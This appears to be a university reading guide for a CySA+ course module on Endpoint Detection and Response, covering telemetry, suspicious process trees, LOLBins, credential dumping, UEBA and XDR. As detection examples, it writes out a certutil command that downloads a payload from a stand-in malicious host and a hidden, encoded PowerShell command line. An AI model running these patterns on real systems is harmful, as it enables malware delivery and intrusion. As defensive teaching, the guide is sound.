# Reading Guide: Module 06 - Endpoint Detection and Response

## Course: CIS-4332 Cyber Analyst | Texas Wesleyan University

## Instructor: Professor Nash

## CySA+ CS0-003 Domain: Domain 1 - Security Operations (33%)

---

## Introduction

Endpoint Detection and Response is the technology layer that gives SOC analysts visibility into process execution, file system activity, registry changes, and network connections at the individual host level. EDR has become the standard for enterprise endpoint security because it captures behavioral telemetry that traditional antivirus cannot, detects fileless and living-off-the-land attacks, and enables remote investigation and containment without physical access to affected systems.

This guide provides the reference material you need to analyze EDR telemetry, recognize key malicious process patterns, and answer CySA+ exam questions on endpoint security.

---

## Section 1: EDR vs. Traditional Antivirus

### 1.1 Comparison

| Attribute | Traditional AV | EDR |
|---|---|---|
| Primary detection method | Signature-based (file hashes, byte patterns) | Behavioral telemetry (process behavior, file ops, network connections) |
| Fileless attack detection | Weak — no file to scan | Strong — captures in-memory execution |
| LOLBin abuse detection | Weak — legitimate tools | Moderate to strong — behavioral context reveals abuse |
| Response capabilities | Quarantine/delete files | Remote isolate, terminate process, collect evidence, run scripts |
| Telemetry retention | Minimal | Continuous historical telemetry (typically 30-90 days) |
| Central management | Basic | Full enterprise console with cross-endpoint search |
| UEBA integration | None | Often included or integrated |

### 1.2 Fileless Malware

Fileless malware executes entirely in memory without writing a malicious executable to disk. It typically uses legitimate Windows processes and scripting engines as execution vectors.

Common fileless attack vectors:

- PowerShell scripts executed directly from memory or command line
- WMI (Windows Management Instrumentation) for remote execution
- Macro-enabled Office documents that execute payloads in memory
- Process hollowing — injecting malicious code into a legitimate process's memory space
- Reflective DLL injection — loading a malicious DLL from memory without writing it to disk

Traditional AV cannot detect fileless attacks because there is no file on disk to scan. EDR captures the execution behavior, memory access patterns, and network activity that reveal the attack.

---

## Section 2: EDR Telemetry Types

### 2.1 Telemetry Categories

| Telemetry Type | What Is Captured | Key Security Value |
|---|---|---|
| Process execution | Process name, path, hash, command line, parent process, user, timestamp | Detects malicious execution, LOLBin abuse, encoded commands |
| Process tree | Parent-child relationships between all processes | Reveals execution chains from initial access to payload execution |
| File operations | File create, modify, rename, delete events with full path and hash | Detects payload drops, data staging, evidence destruction |
| Registry operations | Registry key create, modify, delete with full path and value | Detects persistence mechanisms (Run keys, services) |
| Network connections | Outbound connections per process — remote IP, port, DNS name | Ties network C2 to specific process; C2 attribution |
| Memory operations | Cross-process memory access (process injection, LSASS access) | Detects credential dumping, process hollowing |
| User activity | Logon, logoff, privilege escalation events at host level | Account abuse, privilege escalation detection |

### 2.2 Process Tree Analysis

The process tree is the hierarchy of parent-child process relationships. Malicious activity often manifests as unexpected parent-child combinations.

| Parent Process | Child Process | Normal? | Security Significance |
|---|---|---|---|
| explorer.exe | chrome.exe, notepad.exe, word.exe | Normal | Standard user activity |
| WINWORD.EXE | cmd.exe or powershell.exe | Suspicious | Office document macro spawning shell |
| excel.exe | wscript.exe | Suspicious | Office macro executing script |
| powershell.exe | powershell.exe -enc | Suspicious | Encoded command, possible evasion |
| svchost.exe | powershell.exe | Suspicious | Service hosting process spawning shell |
| cmd.exe | net.exe, whoami.exe, ipconfig.exe | Potentially suspicious | Discovery commands from shell |
| lsass.exe | Anything unexpected | Very suspicious | LSASS should not spawn child processes |
| msiexec.exe | powershell.exe | Suspicious | Installer spawning shell — possible malicious installer |

---

## Section 3: Living-Off-the-Land Binaries (LOLBins)

### 3.1 LOLBin Reference Table

LOLBins are legitimate Windows binaries that attackers abuse to execute malicious payloads, bypass security controls, and evade detection.

| Binary | Normal Purpose | Malicious Use | ATT&CK Technique |
|---|---|---|---|
| powershell.exe | Administrative scripting | Execute encoded payloads, download stages, invoke in-memory code | T1059.001 |
| cmd.exe | Command prompt | Execute commands, chain tools | T1059.003 |
| wscript.exe | Windows Script Host | Execute VBScript/JScript payloads | T1059.005 |
| cscript.exe | Command-line script host | Same as wscript.exe | T1059.005 |
| mshta.exe | Execute .hta files | Execute malicious HTA payloads | T1218.005 |
| rundll32.exe | Load and run DLLs | Execute malicious DLLs | T1218.011 |
| regsvr32.exe | Register COM objects | Execute malicious DLLs via scrobj.dll | T1218.010 |
| certutil.exe | Certificate utility | Download files, decode base64 | T1105 / T1140 |
| bitsadmin.exe | Background file transfer | Download malicious files | T1197 |
| wmic.exe | WMI command-line | Remote execution, persistence via event subscriptions | T1047 |
| msiexec.exe | Install MSI packages | Execute malicious MSI packages | T1218.007 |
| cmstp.exe | Connection Manager setup | Bypass UAC, load malicious INF files | T1218.003 |

### 3.2 Detection Approach for LOLBins

Detecting LOLBin abuse requires behavioral context because the binary itself is legitimate. Key indicators:

- Unexpected parent process (certutil.exe spawned by WINWORD.EXE)
- Unusual command-line arguments (`certutil.exe -urlcache -f http://malicious.com/payload.exe`)
- Network connections from LOLBins that do not normally make network connections
- Execution from non-standard paths or user-writable directories
- Execution outside normal business hours or by non-administrative accounts that never use these tools

---

## Section 4: Key Malicious Execution Patterns

### 4.1 Office Document Macro Execution Chain

```text
Step 1: User opens malicious Word document
Step 2: Macro executes inside WINWORD.EXE
Step 3: WINWORD.EXE spawns cmd.exe or powershell.exe [ANOMALY]
Step 4: PowerShell downloads and executes payload from internet [ANOMALY]
Step 5: Payload establishes persistence (scheduled task, Run key) [ANOMALY]
Step 6: Payload establishes C2 connection [ANOMALY]

ATT&CK mapping:
- T1566.001: Spearphishing Attachment (Initial Access)
- T1059.001: PowerShell (Execution)
- T1105: Ingress Tool Transfer (download stage)
- T1053.005 or T1547.001: Persistence
- T1071: Application Layer Protocol (C2)
```

### 4.2 Encoded PowerShell Commands

Attackers use Base64-encoded commands with the -EncodedCommand flag to hide payload content from basic string scanning.

```text
Malicious command line:
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden
  -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==

Detection indicators:
- -EncodedCommand or -enc flag present
- -WindowStyle Hidden (prevents UI window)
- -NoProfile (bypasses profile-based logging)
- Long base64 string in command line
- Spawned by non-administrative user or unexpected parent
```

### 4.3 LSASS Credential Dumping Sequence

```text
Step 1: Attacker obtains code execution on endpoint
Step 2: Process accesses lsass.exe memory (Sysmon Event ID 10)
Step 3: NTLM hashes extracted from LSASS
Step 4: Hashes used for Pass-the-Hash or offline cracking

EDR detection: GrantedAccess value 0x1010 or 0x1038 from non-system process to lsass.exe
ATT&CK technique: T1003.001 — OS Credential Dumping: LSASS Memory
```

### 4.4 Persistence Mechanisms Detected by EDR

| Mechanism | ATT&CK Technique | EDR Telemetry Signal |
|---|---|---|
| Registry Run Key | T1547.001 | Registry write to HKLM or HKCU Run keys by non-installer process |
| Scheduled Task | T1053.005 | Process creation of schtasks.exe with /Create argument |
| Startup Folder | T1547.001 | File creation in user or all-user startup folder path |
| Service Installation | T1543.003 | sc.exe create or registry write to HKLM\SYSTEM\CurrentControlSet\Services |
| WMI Event Subscription | T1546.003 | WMI event filter and consumer creation via wmic.exe or PowerShell |
| DLL Search Order Hijacking | T1574.001 | DLL placed in directory searched before legitimate DLL location |

---

## Section 5: UEBA and Behavioral Analytics

### 5.1 UEBA Overview

User and Entity Behavior Analytics (UEBA) builds a statistical baseline of normal behavior for each user and entity (host) in the environment. It alerts when observed behavior deviates significantly from that individual's established baseline.

| Rule-Based SIEM Detection | UEBA Detection |
|---|---|
| Fires when events match predefined rules regardless of user history | Fires when behavior deviates from that specific user's baseline |
| High false positive for edge cases | Lower false positive — adapts to individual normal behavior |
| Cannot detect "first time" anomalies for authorized users | Specifically detects anomalous authorized-user behavior |
| Requires known attack pattern to write rule | Can detect unknown attack patterns via statistical deviation |
| Best for known threat techniques | Best for insider threats, account compromise, novel behaviors |

### 5.2 UEBA Example Scenarios

Scenario: A user whose account has never performed large file exports runs a database query returning 50,000 records and downloads the result. No rule-based alert fires because the user's credentials are valid and the action is technically authorized. UEBA flags this as a significant behavioral deviation from that user's historical patterns.

Scenario: A service account that has historically only logged in from application servers at 10.0.5.x is observed logging in from 10.0.9.88 (an employee workstation) at 3 AM. UEBA flags the source IP deviation and the time deviation simultaneously.

---

## Section 6: XDR — Extended Detection and Response

### 6.1 EDR vs. XDR

| Attribute | EDR | XDR |
|---|---|---|
| Data sources | Endpoint telemetry only | Endpoint + network + email + cloud + identity |
| Alert correlation | Per-endpoint | Cross-layer, correlates alerts from all sources |
| Investigation scope | Host-level | End-to-end attack chain across all layers |
| Deployment complexity | Moderate | High |
| Visibility | Deep endpoint | Broad cross-environment |

XDR enables an analyst to see a complete attack chain — the phishing email, the endpoint execution, the lateral movement, the C2 communication, and the data exfiltration — as a single correlated incident rather than isolated alerts from separate tools.

---

## Section 7: EDR Response Capabilities

### 7.1 Remote Response Actions

| Action | Description | When to Use |
|---|---|---|
| Network isolation | Disconnects host from all network traffic except management channel | Confirmed compromise; prevent lateral spread |
| Process termination | Kills a specific process on the endpoint | Active malicious process; immediate threat |
| File quarantine | Moves a file to quarantine location; prevents execution | Malicious file identified; not yet safe to delete |
| Evidence collection | Collects memory dump, process snapshot, or specific files | Preserve forensic evidence before remediation |
| Script execution | Run a remediation script on the endpoint remotely | Mass remediation; post-compromise cleanup |
| Rollback | Reverse changes made by malware using EDR telemetry | Some EDR platforms support undo of detected ransomware activity |

---

## CySA+ Exam Tips

Exam Tip 1: The key differentiator for EDR vs. traditional AV is behavioral telemetry vs. signature detection. If an exam scenario describes fileless malware or LOLBin abuse that AV missed, EDR is the solution.

Exam Tip 2: Know the suspicious parent-child process combinations: Office applications spawning cmd.exe or PowerShell is the most commonly tested pattern.

Exam Tip 3: LSASS memory access via Sysmon Event ID 10 is the EDR indicator for T1003.001 credential dumping. Know the event ID and the GrantedAccess value context.

Exam Tip 4: LOLBins are legitimate tools. Detecting their abuse requires behavioral context: unexpected parent, unusual arguments, unexpected network connections, execution from non-standard paths.

Exam Tip 5: Network isolation via EDR maintains the management console connection while blocking all other traffic. An analyst can continue investigation on an isolated host. This is critical for preserving forensic evidence.

Exam Tip 6: UEBA detects behavioral deviations from individual baselines. It is most valuable for insider threats and account compromise scenarios where legitimate credentials are being abused.

Exam Tip 7: XDR integrates multiple telemetry sources (endpoint + network + email + cloud) for cross-layer correlation. It is not a replacement for SIEM; it is complementary.

Exam Tip 8: Encoded PowerShell (-EncodedCommand, -enc) is a high-fidelity indicator of malicious activity. The combination with -WindowStyle Hidden and -NoProfile increases confidence.

---

## Glossary

- EDR: Endpoint Detection and Response; behavioral telemetry-based endpoint security platform
- Fileless Malware: Malware that executes entirely in memory without writing to disk; bypasses file-based AV
- LOLBin: Living Off the Land Binary; legitimate Windows tool used maliciously to avoid detection
- LSASS: Local Security Authority Subsystem Service; Windows process that stores authentication credentials in memory
- Process Hollowing: Injection technique that creates a legitimate process and replaces its code with malicious code
- Process Injection: Inserting malicious code into a running legitimate process's memory space
- Process Tree: Parent-child hierarchy of running processes; used to trace execution chains
- Reflective DLL Injection: Loading a DLL from memory without writing it to disk
- UEBA: User and Entity Behavior Analytics; detects anomalies from individual behavioral baselines
- XDR: Extended Detection and Response; integrates endpoint, network, email, cloud, and identity telemetry

---

## Required Resources

- Official CySA+ CS0-003 exam objectives: comptia.org
- Professor Messer CySA+ CS0-003 free study materials: professormesser.com

---

## Study Checklist

- [ ] Explain the primary detection difference between traditional AV and EDR without notes
- [ ] Describe the six EDR telemetry categories and what each captures
- [ ] Identify five suspicious parent-child process combinations from the process tree table
- [ ] List ten LOLBins, their normal purpose, and their malicious use from memory
- [ ] Trace the Office document macro execution chain through all six steps and map each to ATT&CK
- [ ] Identify the Sysmon Event ID and the field that indicates LSASS credential dumping
- [ ] Explain the difference between rule-based SIEM detection and UEBA
- [ ] Describe all six EDR remote response actions and when to use each
- [ ] Explain what XDR adds beyond EDR
- [ ] Review all eight exam tips
- [ ] Complete the Module 06 Lab
- [ ] Complete the Module 06 Quiz
- [ ] Post initial response to the Module 06 Discussion board by Wednesday at 11:59 PM
